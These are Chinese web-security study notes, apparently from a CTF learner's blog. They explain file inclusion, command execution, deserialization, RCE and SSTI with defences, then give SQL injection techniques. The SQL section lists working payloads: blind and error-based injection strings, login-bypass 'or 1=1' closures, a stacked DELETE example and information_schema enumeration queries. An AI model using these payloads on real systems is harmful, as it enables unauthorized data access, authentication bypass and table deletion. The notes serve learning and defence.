<h3 id="1-fileinclude漏洞原理"><a href="#1-fileinclude漏洞原理" class="headerlink" title="1.fileinclude漏洞原理"></a>1.fileinclude漏洞原理</h3><p>开发人员将<u><strong>需要重复调用的函数写入一个文件，对该文件进行包含是产生的操作</strong></u>。这样编写代码能减少代码冗余，降低代码后期维护难度，保证网站整体风格统一：导航栏、底部footer栏等。<u><strong>文件包含函数加载的参数没有经过过滤或严格定义，可以被用户控制，包含其他恶意文件，导致了执行非预期代码</strong></u>。</p>
<h3 id="2-危害-6"><a href="#2-危害-6" class="headerlink" title="2.危害"></a>2.危害</h3><blockquote>
<p>①获取敏感信息<br>②执行任意命令<br>③获取服务器权限</p>
</blockquote>
<h3 id="3-防御-6"><a href="#3-防御-6" class="headerlink" title="3.防御"></a>3.防御</h3><blockquote>
<p>①建议白名单。<br>②指定访问一定的路径，再将参数拼接到路径当中。</p>
</blockquote>
<hr>
<h2 id="八、logic-loophole漏洞篇"><a href="#八、logic-loophole漏洞篇" class="headerlink" title="八、logic loophole漏洞篇"></a>八、logic loophole漏洞篇</h2><h3 id="1-logic-loophole漏洞原理"><a href="#1-logic-loophole漏洞原理" class="headerlink" title="1.logic loophole漏洞原理"></a>1.logic loophole漏洞原理</h3><p>指攻击者<u><strong>利用业务的设计缺陷，获取敏感信息或破坏业务的完整性</strong></u>。一般出现在<u><strong>密码修改、越权访问、密码找回、交易支付</strong></u>等功能处。</p>
<h3 id="2-危害-7"><a href="#2-危害-7" class="headerlink" title="2.危害"></a>2.危害</h3><p>任意密码修改、越权访问、密码任意找回、交易支付金额任意修改等</p>
<h3 id="3-防御-7"><a href="#3-防御-7" class="headerlink" title="3.防御"></a>3.防御</h3><h4 id="1-任意密码修改"><a href="#1-任意密码修改" class="headerlink" title="1.任意密码修改"></a>1.任意密码修改</h4><h4 id="2-越权访问"><a href="#2-越权访问" class="headerlink" title="2.越权访问"></a>2.越权访问</h4><p>越权访问漏洞产生<u><strong>主要原因是没有对用户的身份做判断和控制</strong></u>，防范这种漏洞时，可以通过session来控制。</p>
<p>例如，在用户登录时，将username或uid写入到<code>session</code><u><strong><code>（会话控制，Session对象存储特定用户会话所需的属性及配置信息。这样，当用户在应用程序的Web页之间跳转时，存储在Session对象中的变量将不会丢失，而是在整个用户会话中一直存在下去。）</code></strong></u>中取出信息，<u><strong><code>而不是从GET或POST取出username</code></strong></u>，name此时取到的username就是没有篡改的。</p>
<hr>
<h2 id="九、command-execution漏洞篇"><a href="#九、command-execution漏洞篇" class="headerlink" title="九、command execution漏洞篇"></a>九、command execution漏洞篇</h2><h3 id="1-command-execution漏洞原理"><a href="#1-command-execution漏洞原理" class="headerlink" title="1.command execution漏洞原理"></a>1.command execution漏洞原理</h3><p>应用未对用户输入做严格的检查过滤，导致用户<u><strong>输入的参数被当成命令来执行</strong></u>。攻击者可以任意执行系统命令，属于高危漏洞之一，也属于代码执行的范畴。</p>
<h3 id="2-危害-8"><a href="#2-危害-8" class="headerlink" title="2.危害"></a>2.危害</h3><blockquote>
<p>①继承web服务程序的权限去执行系统命令或读写文件。<br>②反弹shell，获得目标服务器的权限。<br>③进一步内网渗透。</p>
</blockquote>
<h3 id="3-防御-8"><a href="#3-防御-8" class="headerlink" title="3.防御"></a>3.防御</h3><blockquote>
<p>①尽量不要使用命令执行函数。<br>②客户端<u><strong>提交的变量在进入执行命令函数前</strong></u>要做好<u><strong>过滤和检测</strong></u>。<br>③在<u><strong>使用动态函数之前</strong></u>，确保使用函数是<u><strong>指定的函数</strong></u>之一。<u><strong>【防止攻击者引入新函数（非网站使用的函数）执行攻击语句】</strong></u><br>④对<u><strong>php语言</strong></u>而言，<u><strong>不能完全控制的危险函数最好不要使用</strong></u>。</p>
</blockquote>
<hr>
<h2 id="十、brute-force篇"><a href="#十、brute-force篇" class="headerlink" title="十、brute force篇"></a>十、brute force篇</h2><h3 id="1-brute-force原理"><a href="#1-brute-force原理" class="headerlink" title="1.brute force原理"></a>1.brute force原理</h3><p>由于服务器端没有做限制，导致攻击者可以通过暴力手段破解所需信息，如用户名、密码、验证码等。暴力破解需要一个强大的字典，如4位数字的验证码，那么暴力破解的范围就是0000~9999，<u><strong>暴力破解的关键在于字典的大小</strong></u>。</p>
<h3 id="2-危害-9"><a href="#2-危害-9" class="headerlink" title="2.危害"></a>2.危害</h3><blockquote>
<p>①用户密码被重置。<br>②敏感目录、参数被枚举。<br>③用户订单被枚举。</p>
</blockquote>
<h3 id="3-防御-9"><a href="#3-防御-9" class="headerlink" title="3.防御"></a>3.防御</h3><blockquote>
<p>① 如果<u><strong>用户登录次数超过设置的阈值</strong></u>，则<u><strong>锁定账号</strong></u>。<br>② 如果<u><strong>某个IP登陆次数超过设置的阈值，则锁定IP</strong></u>。但<u><em><strong>存在一个问题</strong></em></u>，如果<u><strong>多个用户使用的是同一个IP，则会造成其他用户也不能登录。</strong></u></p>
</blockquote>
<hr>
<h2 id="十一、Deserialization-Vulnerabilities（PHP）"><a href="#十一、Deserialization-Vulnerabilities（PHP）" class="headerlink" title="十一、Deserialization Vulnerabilities（PHP）"></a>十一、Deserialization Vulnerabilities（PHP）</h2><h3 id="1-Deserialization-Vulnerabilities漏洞原理"><a href="#1-Deserialization-Vulnerabilities漏洞原理" class="headerlink" title="1.Deserialization Vulnerabilities漏洞原理"></a>1.Deserialization Vulnerabilities漏洞原理</h3><p>PHP反序列化漏洞也叫PHP对象注入，是一个非常常见的漏洞，这种类型的漏洞虽然有些难以利用，但一旦利用成功就会造成非常危险的后果。</p>
<p>漏洞的形成的<u><strong>根本原因是程序没有对用户输入的反序列化字符串进行检测，导致反序列化过程可以被恶意控制，进而造成代码执行、getshell等一系列不可控的后果</strong></u>。反序列化漏洞并不是PHP特有，<u><strong>也存在于Java、Python等语言</strong></u>之中，但其原理基本相通。</p>
<p>PHP类都含有几个特定的元素: 类属性、类常量、类方法。每一个类至少都含有以上三个元素，而这三个元素也可以组成最基本的类。那么按照特定的格式将这三个元素表达出来就可以将一个完整的类表示出来并传递。</p>
<p><u>序列化就是将一个<strong>类</strong>压缩成一个字符串的方法</u></p>
<h3 id="2-危害-10"><a href="#2-危害-10" class="headerlink" title="2.危害"></a>2.危害</h3><p><u><strong>未对用户输入的序列化字符串进行检测</strong></u>，导致<u><strong>攻击者可以控制反序列化过程</strong></u>，从而<u><strong>导致代码执行，SQL注入，目录遍历等不可控后果</strong></u>。在反序列化的过程中自动触发了某些魔术方法。</p>
<h3 id="3-防御-10"><a href="#3-防御-10" class="headerlink" title="3.防御"></a>3.防御</h3><h4 id="1-签名与认证"><a href="#1-签名与认证" class="headerlink" title="1)签名与认证"></a>1)签名与认证</h4><p>如果序列化的内容没有用户可控参数，仅仅是服务端存储和应用，则可以通过签名认证，来避免应用接受黑客的异常输入。   </p>
<h4 id="2-限制序列化与反序列化的类"><a href="#2-限制序列化与反序列化的类" class="headerlink" title="2)限制序列化与反序列化的类"></a>2)限制序列化与反序列化的类</h4><p>增加一层序列化和反序列化接口类。这就相当于允许提供了一个白名单的过滤：只允许某些类可以被反序列化。只要你在反序列化的过程中，避免接受处理任何类型（包括类成员中的接口、泛型等），黑客其实很难控制应用反序列化过程中所使用的类，也就没有办法构造出调用链，自然也就很难利用反序列化漏洞了</p>
<h4 id="3-RASP检测"><a href="#3-RASP检测" class="headerlink" title="3)RASP检测"></a>3)RASP检测</h4><p>（<code>Runtime Application Self-Protection</code>，实时程序自我保护）。RASP 通过 hook 等方式，在这些关键函数（例如：序列化，反序列化)的调用中，增加一道规则的检测。这个规则会判断应用是否执行了非应用本身的逻辑，能够在不修改代码的情况下对反序列化漏洞攻击实现拦截.</p>
<h3 id="4-利用"><a href="#4-利用" class="headerlink" title="4.利用"></a>4.利用</h3><h4 id="1-wakeup-绕过"><a href="#1-wakeup-绕过" class="headerlink" title="1)__wakeup( )绕过"></a>1)__wakeup( )绕过</h4><p><code>(CVE-2016-7124)</code></p>
<p>反序列化时，如果表示对象<code>属性个数的值大于真实的属性个数</code>时就会<code>跳过__wakeup( )的执行</code>。</p>
<h4 id="2-注入对象构造方法"><a href="#2-注入对象构造方法" class="headerlink" title="2)注入对象构造方法"></a>2)注入对象构造方法</h4><p>当目标对象被<code>private、protected修饰时的构造方法</code>。</p>
<h4 id="3-Session反序列化漏洞"><a href="#3-Session反序列化漏洞" class="headerlink" title="3)Session反序列化漏洞"></a>3)Session反序列化漏洞</h4><p>PHP中的<code>Session经序列化后存储，读取时再进行反序列化</code>。</p>
<h4 id="4-PHAR利用"><a href="#4-PHAR利用" class="headerlink" title="4)PHAR利用"></a>4)PHAR利用</h4><p>PHAR (“Php ARchive”) 是PHP里类似于JAR的一种打包文件，在PHP 5.3 或更高版本中默认开启，这个特性使得 PHP也可以像 Java 一样方便地实现应用程序打包和组件化。一个应用程序可以打成一个 Phar 包，直接放到 PHP-FPM 中运行。</p>
<hr>
<h2 id="十二、rce漏洞篇"><a href="#十二、rce漏洞篇" class="headerlink" title="十二、rce漏洞篇"></a>十二、rce漏洞篇</h2><h3 id="1-rce漏洞原理"><a href="#1-rce漏洞原理" class="headerlink" title="1.rce漏洞原理"></a>1.rce漏洞原理</h3><p>一般出现这种漏洞，是因为应用系统<u><strong>从设计上需要给用户提供指定的远程命令操作的接口</strong></u>。比如我们常见的路由器、防火墙、入侵检测等设备的web管理界面上。一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。 如果，设计者在完成该功能时，<u><strong>没有做严格的安全控制，则可能会<code>导致攻击者通过该接口提交“意想不到”的命令</code>，从而让后台进行执行，从而控制整个后台服务器</strong></u>。 现在很多的企业都开始实施自动化运维,大量的系统操作会通过”自动化运维平台”进行操作。在这种平台上往往会出现远程系统命令执行的漏洞。 远程代码执行 同样的道理,因为需求设计,后台有时候也会把用户的输入作为代码的一部分进行执行,也就造成了远程代码执行漏洞。 不管是使用了代码执行的函数,还是使用了不安全的反序列化等等。 </p>
<blockquote>
<p>因此，如果需要给<u><strong>前端用户提供操作类的API接口（一般指应用程序的编程接口，主要目的是提供应用程序与开发人员以访问一组例程的能力，而又无需访问源码，或理解内部工作机制的细节），一定需要对接口输入的内容进行严格的判断</strong></u>，比如<code>实施严格的白名单策略</code>会是一个比较好的方法。</p>
</blockquote>
<h3 id="2-危害-11"><a href="#2-危害-11" class="headerlink" title="2.危害"></a>2.危害</h3><p>RCE漏洞，可以让攻击者直接向后台服务器远程注入<u><strong>操作系统命令或者代码</strong></u>，从而控制后台系统。</p>
<h3 id="3-防御-11"><a href="#3-防御-11" class="headerlink" title="3.防御"></a>3.防御</h3><blockquote>
<p>1)尽量不要使用命令执行函数。</p>
<p>2)不要让用户控制参数。</p>
<p>3)执行前做好检测和过滤。</p>
</blockquote>
<hr>
<h2 id="十三、ssti漏洞篇"><a href="#十三、ssti漏洞篇" class="headerlink" title="十三、ssti漏洞篇"></a>十三、ssti漏洞篇</h2><h3 id="1-ssti漏洞原理"><a href="#1-ssti漏洞原理" class="headerlink" title="1.ssti漏洞原理"></a>1.ssti漏洞原理</h3><p><a href="https://xz.aliyun.com/t/3679#toc-0">推荐文章</a></p>
<p>SSTI是一种注入类的漏洞，其<code>成因也可以类比SQL注入</code><br>SQL注入是从用户获得一个输入，然后用后端脚本语言进行数据库查询，利用输入来拼接我们想要的SQL语句。SSTI也是获取一个输入，然后在后端的渲染处理上进行语句的拼接执行。但是和SQL注入不同的，</p>
<p>SSTI利用的是现有的网站模板引擎，主要针对Python、PHP、JAVA的一些网站处理框架，比如Python的<strong>jinja2、mako、tornado、Django</strong>，PHP的<strong>smarty twig</strong>，java的<strong>jade velocity</strong>。当这些框架对运用渲染函数生成html的时候，在过滤不严情况下，通过构造恶意输入数据，从而达到getshell或其他目的。</p>
<blockquote>
<p><code>一句话就是服务端在接收用户输入或用户可控参数后，未作处理或未进行严格过滤，直接嵌入模板渲染，导致执行恶意代码</code></p>
</blockquote>
<p><strong>模板注入</strong>涉及的是服务端Web应用使用模板引擎<strong>渲染用户请求的过程</strong>，<br> 服务端把<strong>用户输入的内容渲染成模板</strong>就可能造成SSTI(Server-Side Template Injection)</p>
<p>模板渲染接受的参数需要用两个大括号<code>&#123;  &#123;&#125;  &#125;</code>括起来</p>
<h3 id="2-危害-12"><a href="#2-危害-12" class="headerlink" title="2.危害"></a>2.危害</h3><p>攻击者在服务器输入语句，服务端将其<u><strong>作为Web应用模板内容的一部分</strong></u>，在进行<u><strong>目标编译渲染</strong></u>的过程中，<u><strong>进行了语句的拼接，执行了所插入的恶意内容</strong></u>，从而<u><strong>导致信息泄露、代码执行、GetShell等</strong></u>问题</p>
<h3 id="3-防御-12"><a href="#3-防御-12" class="headerlink" title="3.防御"></a>3.防御</h3><blockquote>
<p>1）和其他的注入防御一样，<u><strong>绝对不要让用户对传入模板的内容或者模板本身进行控制</strong></u></p>
<p>2）<u><strong>减少或者放弃直接使用格式化字符串结合字符串拼接的模板渲染</strong></u>方式，<u><strong>使用正规的模板渲染方法</strong></u></p>
</blockquote>
<h1 id="漏洞知识点记录笔记（一）"><a href="#漏洞知识点记录笔记（一）" class="headerlink" title="漏洞知识点记录笔记（一）"></a>漏洞知识点记录笔记（一）</h1><blockquote>
<p>补充一些知识点</p>
</blockquote>
<hr>
<h2 id="一、sql"><a href="#一、sql" class="headerlink" title="一、sql"></a>一、sql</h2><h3 id="sql注入的分类"><a href="#sql注入的分类" class="headerlink" title="sql注入的分类"></a>sql注入的分类</h3><h4 id="①按照数据提交的方式来分类："><a href="#①按照数据提交的方式来分类：" class="headerlink" title="①按照数据提交的方式来分类："></a>①按照数据提交的方式来分类：</h4><p>  （1）<code>GET</code> 注入：提交数据的方式是 GET , 注入点的位置在 GET 参数部分。比如有这样的一个链接<code>http://xxx.com/news.php?id=1</code> , id 是注入点。</p>
<p>  （2）<code>POST</code> 注入：使用 POST 方式提交数据，注入点位置在 POST 数据部分，常发生在表单中(输入框)。</p>
<p>  （3）<code>Cookie</code> 注入：HTTP请求的时候会带上客户端的Cookie, 注入点在Cookie当中的某个字段中。</p>
<p>  （4）<code>HTTP</code> 头部注入：注入点在 HTTP 请求头部的某个字段中。比如存在 User-Agent 字段中。严格讲的话，Cookie 其实应该也是算头部注入的一种形式。因为在 HTTP 请求的时候，Cookie 是头部的一个字段。</p>
<h4 id="②按照执行效果来分类："><a href="#②按照执行效果来分类：" class="headerlink" title="②按照执行效果来分类："></a>②按照执行效果来分类：</h4><h5 id="（1）基于布尔的盲注："><a href="#（1）基于布尔的盲注：" class="headerlink" title="（1）基于布尔的盲注："></a>（1）基于布尔的盲注：</h5><blockquote>
<p>bool盲注，即可以根据返回页面判断条件真假的注入。</p>
<p>一般根据数据字符asiic码大小或字符长短，用二分法进行判断字符答案</p>
<p>长度比如</p>
</blockquote>
<figure class="highlight basic"><table><tr><td class="code"><pre><span class="line"><span class="symbol">1 </span><span class="keyword">and</span> length(database()) &gt; <span class="number">5</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>意思就是判断数据库名大于5，如果返回假就在小于5里找，如果返回真，就在大于5范围里找，猜测到大概的长度的时候，可以用&#x3D;试试</p>
</blockquote>
<blockquote>
<p>对于单一字符猜测，可以利用字母的<code>ascii</code>码，</p>
</blockquote>
<p>比如</p>
<figure class="highlight basic"><table><tr><td class="code"><pre><span class="line"><span class="symbol">1 </span><span class="keyword">and</span> ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">110</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>substr是截取字符，如上就是从第一个字符截取，截取一个字符<br>意思就是判断数据库名第一个字母的ascii码是否大于110，返回假就在小于110里找，返回真，就在大于110里找，最后可以用&#x3D;加以确定</p>
</blockquote>
<p><code>可以用burpsuite进行payload爆破，用数字字典，直接从0-127（ascii码共127位），然后根据回显，判断，就不用一个一个慢慢尝试</code></p>
<p><code>强烈建议可以学习一下python，这样可以自己针对性的写一个脚本，效率更高</code></p>
<h5 id="（2）基于时间的盲注："><a href="#（2）基于时间的盲注：" class="headerlink" title="（2）基于时间的盲注："></a>（2）基于时间的盲注：</h5><blockquote>
<p>即不能根据页面返回内容判断任何信息，用条件语句（if）查看时间延迟语句（sleep()）是否执行（即页面返回时间是否增加）来判断。</p>
</blockquote>
<figure class="highlight basic"><table><tr><td class="code"><pre><span class="line"><span class="symbol">1 </span><span class="keyword">and</span> <span class="keyword">if</span>(length(database()&gt;<span class="number">7</span>,sleep(<span class="number">5</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>这里判断如果数据库名大于7，就延迟网页5s，反正没有延迟【就是执行1】，剩下的和bool盲注一样，挨个试试，推测出数据库名和其他数据</p>
</blockquote>
<h5 id="（3）基于报错注入："><a href="#（3）基于报错注入：" class="headerlink" title="（3）基于报错注入："></a>（3）基于报错注入：</h5><blockquote>
<p>即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。如：单引号、双引号、基于数字型注入。</p>
</blockquote>
<p>比如，查询数据库名</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> group_concat(<span class="built_in">schema_name</span>) <span class="keyword">from</span> information_schema.schemata),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p> *<strong>注意</strong></p>
<blockquote>
<p>extractvalue和updatexml只显示<code>32</code>位字符</p>
<p>所以爆出字符不全时，可以用<code>left(xxx,length)</code>和<code>right(xxx,length)</code><br>【注意0x7e也就是<del>也算字符位，按上面例子用了两个</del>，所以这里最多只能select 30个字符了，但左右都30，一共可以select 60个字符】</p>
<p>或者用<code>substr(xxx,begin,length)</code>，从数据的某个开始【这里的开始位是从1开始，而不是0】截取一部分显示</p>
</blockquote>
<h5 id="（4）联合查询注入：可以使用union的情况下的注入。"><a href="#（4）联合查询注入：可以使用union的情况下的注入。" class="headerlink" title="（4）联合查询注入：可以使用union的情况下的注入。"></a>（4）联合查询注入：可以使用union的情况下的注入。</h5><h5 id="（5）堆查询注入（堆叠注入）：可以同时执行多条语句的执行时的注入。"><a href="#（5）堆查询注入（堆叠注入）：可以同时执行多条语句的执行时的注入。" class="headerlink" title="（5）堆查询注入（堆叠注入）：可以同时执行多条语句的执行时的注入。"></a>（5）堆查询注入（堆叠注入）：可以同时执行多条语句的执行时的注入。</h5><h5 id="（6）宽字节注入：暂时未学"><a href="#（6）宽字节注入：暂时未学" class="headerlink" title="（6）宽字节注入：暂时未学"></a>（6）宽字节注入：暂时未学</h5><h4 id="③按照注入点类型来分类："><a href="#③按照注入点类型来分类：" class="headerlink" title="③按照注入点类型来分类："></a>③按照注入点类型来分类：</h4><p>  （1）数字型注入点：许多网页链接有类似的结构 <code>http://xxx.com/users.php?id=1</code> 基于此种形式的注入，其注入点 id 类型为数字若存在注入点，则可以利用网页通过此种结构传递id等信息的原理，构造出类似如下的sql注入语句进行爆破：select * from 表名 where id&#x3D;1 and 1&#x3D;1</p>
<p>  （2）字符型注入点：网页链接有类似的结构 <code>http://xxx.com/users.php?name=admin</code> 这种形式，其注入点 name 类型为字符类型，若存在注入，我们可以构造出类似与如下的sql注入语句进行爆破：select * from 表名 where name&#x3D;‘admin’ and 1&#x3D;1 ’</p>
<p>  （3）搜索型注入点：这是一类特殊的注入类型。这类注入主要是指在进行数据搜索时没过滤搜索参数，一般在链接地址中有 “keyword&#x3D;关键字” 有的不显示在的链接地址里面，而是直接通过搜索框表单提交。此类注入点提交的 SQL 语句，其原形大致为：select * from 表名 where 字段 like ‘%关键字%’ 若存在注入，我们可以构造出类似与如下的sql注入语句进行爆破：select * from 表名 where 字段 like ‘%测试%’ and ‘%1%’&#x3D;’%1%’</p>
<h4 id="④基于程度和顺序的注入-哪里发生了影响"><a href="#④基于程度和顺序的注入-哪里发生了影响" class="headerlink" title="④基于程度和顺序的注入(哪里发生了影响)"></a>④基于程度和顺序的注入(哪里发生了影响)</h4><p><code>★一阶注射</code> </p>
<p><code>★二阶注射</code> </p>
<blockquote>
<p>一阶注射是指输入的注射语句对 WEB 直接产生了影响，出现了结果；</p>
<p>二阶注入类似存储型 XSS，是指输入提交的语句，无法直接对 WEB 应用程序产生影响，通过其它的辅助间接的对 WEB 产生危害，这样的就被称为是二阶注入. </p>
</blockquote>
<h4 id="1-堆叠注入"><a href="#1-堆叠注入" class="headerlink" title="1.堆叠注入"></a>1.堆叠注入</h4><h5 id="1-堆叠注入定义"><a href="#1-堆叠注入定义" class="headerlink" title="1.堆叠注入定义"></a>1.堆叠注入定义</h5><blockquote>
<p>   Stacked  injections(堆叠注入)从名词的含义就可以看到应该是一堆 sql 语句(多条)一起执行。而在真实的运用中也是这样的, 我们知道在  mysql 中, 主要是命令行中, 每一条语句结尾加; 表示语句结束。这样我们就想到了是不是可以多句一起使用。这个叫做 stacked  injection。</p>
</blockquote>
<h5 id="2-堆叠注入原理"><a href="#2-堆叠注入原理" class="headerlink" title="2.堆叠注入原理"></a>2.堆叠注入原理</h5><p>   在SQL中，分号（;）是用来表示一条sql语句的结束。<u>试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入</u>。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于<u>union 或者union all执行的语句类型是有限的，可以用来执行查询语句</u>，而<u>堆叠注入可以执行的是任意的语句</u>。例如以下这个例子。用户输入：<code>1; DELETE FROM products</code>服务器端生成的sql语句为：  <code>Select * from products where productid=1;DELETE FROM products</code>当执行查询后，<u><strong>第一条显示查询信息</strong></u>，<u><strong>第二条则将整个表进行删除</strong></u>。</p>
<h5 id="3-堆叠注入的局限性"><a href="#3-堆叠注入的局限性" class="headerlink" title="3.堆叠注入的局限性"></a>3.堆叠注入的局限性</h5><p>堆叠注入的局限性在于并不是每一个环境下都可以执行，可能受到API或者数据库引擎不支持的限制，当然了权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序。</p>
<p><strong>下面我以一道题为例解析堆叠注入，该题来自于<a href="../../../../2022/06/21/buuctf-wp"> buuctf的[强网杯 2019]随便注 </a></strong></p>
<h4 id="2-无列名注入"><a href="#2-无列名注入" class="headerlink" title="2.无列名注入"></a>2.<a href="https://www.cnblogs.com/Lee-404/p/12833788.html">无列名注入</a></h4><p>上面链接是一篇大佬讲解的无列名注入，之前刷攻防世界遇到类似的题目，看了这篇文章学到了新技巧</p>
<h4 id="3-联合注入"><a href="#3-联合注入" class="headerlink" title="*3.联合注入"></a>*3.联合注入</h4><p><strong>联合注入有个技巧。在联合查询并不存在的数据时，联合查询就会构造一个 虚拟的数据</strong></p>
<p>举个例子：<br>最初users表中只有一行数据，</p>
<p><img src="/2022/05/28/Web-study/image-20220909230928678.png" alt="image-20220909230928678"></p>
<p><strong>我们通过<code>union select</code>查询就可以构造一行虚拟的数据，</strong></p>
<p><img src="/2022/05/28/Web-study/image-20220909231009396.png" alt="image-20220909231009396"></p>
<p>这样，我们在users表中利用联合查询创建了一行虚拟的数据。</p>
<hr>
<h4 id="1-几个常用函数"><a href="#1-几个常用函数" class="headerlink" title="1.几个常用函数"></a>1.几个常用函数</h4><blockquote>
<p>1.<code>version()</code>——MySQL 版本 </p>
<p>2.<code>user()</code>——数据库用户名 </p>
<p>3.<code>database()</code>——数据库名 </p>
<p>4.<code>@@datadir</code>——数据库路径 </p>
<p>5.<code>@@version_compile_os</code>——操作系统版本</p>
</blockquote>
<h4 id="2-一般用于尝试的闭合语句"><a href="#2-一般用于尝试的闭合语句" class="headerlink" title="2.一般用于尝试的闭合语句"></a>2.一般用于尝试的<u>闭合语句</u></h4><p>Ps:&#96;&#96;–+可以用#替换，url 提交过程中 Url 编码后的#为%23，–和#为注释符，把后面语句注释掉，使其无法执行&#96;</p>
<blockquote>
<p>有时用–+，而不用#的原因是，http无法解释#，所以用–+来代替，<br>–+中起到注释作用其实是–，但是如果单纯的–会和后面的内容连上从而导致sql语句出错，所以有了+会解释为空格，从而避免报错<br>故<br>–%20   &lt;&#x3D;&#x3D;&gt;   –+</p>
</blockquote>
<blockquote>
<p>or 1&#x3D;1–+</p>
<p>‘or 1&#x3D;1–+</p>
<p>“or 1&#x3D;1–+</p>
<p>)or 1&#x3D;1–+</p>
<p>‘)or 1&#x3D;1–+</p>
<p>“) or 1&#x3D;1–+</p>
<p>“))or 1&#x3D;1–+</p>
</blockquote>
<h4 id="3-sql中逻辑运算【万能密码的原理】"><a href="#3-sql中逻辑运算【万能密码的原理】" class="headerlink" title="3.sql中逻辑运算【万能密码的原理】"></a>3.sql中逻辑运算【万能密码的原理】</h4><p>提出一个问题 <code>Select * from users where id=1 and 1=1</code>;这条语句为什么能够选择出 id&#x3D;1 的内容，and 1&#x3D;1 到底起作用了没有？这里就要清楚 sql 语句执行顺序了。 同时这个问题我们在使用万能密码的时候会用到。</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Select</span> * <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">where</span> username=<span class="string">&#x27;admin&#x27;</span> <span class="keyword">and</span> <span class="keyword">password</span>=<span class="string">&#x27;admin&#x27;</span></span><br></pre></td></tr></table></figure>

<p>我们可以用 <code>’or 1=1#</code> 作为密码输入。原因是为什么？ </p>
<p>这里涉及到一个逻辑运算，当使用上述所谓的万能密码后，构成的 sql 语句为： </p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">Select * <span class="keyword">from</span> admin where <span class="attribute">username</span>=<span class="string">&#x27;admin&#x27;</span> <span class="keyword">and</span> <span class="attribute">password</span>=<span class="string">&#x27;&#x27;</span>or <span class="attribute">1</span>=1#&#x27;</span><br></pre></td></tr></table></figure>

<p>Explain:上面的这个语句执行后，我们在不知道密码的情况下就登录到了 admin 用户了。原 因 是 在 where 子 句 后 ， 我 们 可 以 看 到 三 个 条 件 语 句 <code>username=&#39;admin&#39; and password=&#39;&#39;or 1=1</code>。三个条件用 and 和 or 进行连接。在 sql 中，我们 <u><strong>and 的运算优先级大于 or 的元算优先级</strong></u>。因此可以看到 <u><strong>第一个条件（用 a 表示）是真的，第二个条件（用 b 表示）是假的，a and b &#x3D; false</strong></u>,第一个条件和第二个条件执行 and 后是假，再与<u><strong>第三 个条件 or 运算，因为第三个条件 1&#x3D;1 是恒成立的，所以结果自然就为真了</strong></u>。因此上述的语 句就是恒真了</p>
<p>ps.<strong><code>逻辑语句的区别</code></strong></p>
<blockquote>
<p>1.and:两个或多个条件同时满足，才为真（显示一条数据）</p>
<p>2.or:两个或多个条件满足其中一个即为真（显示一条数据）</p>
<blockquote>
<p>使用and语句注意<code>select * from test where a = 1 and a = 2</code>这样操作肯定不行，<u><strong>后面的一个值会把前面的值给覆盖掉</strong></u>，最后执行的是<code>select * from test where a = 2</code></p>
<p>而用or语句的话<code>select * from test where a = 1 or a = 2</code>,执行<code>select * from test where a = 1</code>,若<code>a=1</code>为假，则执行<code>select * from test where a = 2</code></p>
</blockquote>
</blockquote>
<blockquote>
<p>3.union:联合查询，将<u><strong>多个查询结果合并（如果有一个结果为空，不影响其他结果合并）</strong></u>起来时，<u><strong>系统会自动去掉重复元组</strong></u></p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> news <span class="keyword">where</span> id<span class="operator">=</span> <span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">2</span>,<span class="number">3</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>这里注意，如果id&#x3D;1，那么结果合并时，就会覆盖后面的结果，所以这里需要前面的语句返回为空，那么后面的数据就会显现出来</p>
</blockquote>
<p>请注意，UNION 内部的 SELECT 语句必须拥有相同数量的列。列也必须拥有相似的数据类型。同时，每条 SELECT 语句中的列的顺序必须相同。 </p>
<h4 id="4-注入的一般流程【按顺序查询注入】"><a href="#4-注入的一般流程【按顺序查询注入】" class="headerlink" title="4.注入的一般流程【按顺序查询注入】"></a>4.注入的一般流程【按顺序查询注入】</h4><h5 id="ps-关键记忆和使用"><a href="#ps-关键记忆和使用" class="headerlink" title="ps.关键记忆和使用"></a>ps.关键记忆和使用</h5><blockquote>
<p>schema_name 数据库名</p>
<p><code>information_schema.schemata</code> 全部数据库</p>
<p><code>table_name</code> 表名</p>
<p><code>information_schema.tables</code> 全部表</p>
<p><code>table_schema=’xxxxx’</code> ‘xxxx’为目标表所在的数据库名</p>
<p><code>column_name</code> 列名</p>
<p><code>information_schema.columns</code> 全部列名</p>
<p><code>table_name=’xxxxx’</code> ‘xxxx’想要查询数据所在的表名</p>
</blockquote>
<h5 id="1-注入语句"><a href="#1-注入语句" class="headerlink" title="[1] 注入语句"></a>[1] 注入语句</h5><blockquote>
<p>1）猜数据库 【以下语句功能，显示该数据库内所有数据库的名字】</p>
<p><code>select schema_name from information_schema.schemata</code> </p>
<p>2）猜某库的数据表 【以下语句功能，显示该数据库内所有数据库的名字】</p>
<p><code>select table_name from information_schema.tables where table_schema=’xxxxx’</code> </p>
<p>3）猜某表的所有列【以下语句功能，显示该数据库内所有数据库的名字】</p>
<p><code>Select column_name from information_schema.columns where table_name=’xxxxx’</code> </p>
<p>4）获取某列的内容 【以下语句功能，显示该列】</p>
<p><code>Select 该列的目标数据分类的名称  from   列名</code></p>
</blockquote>
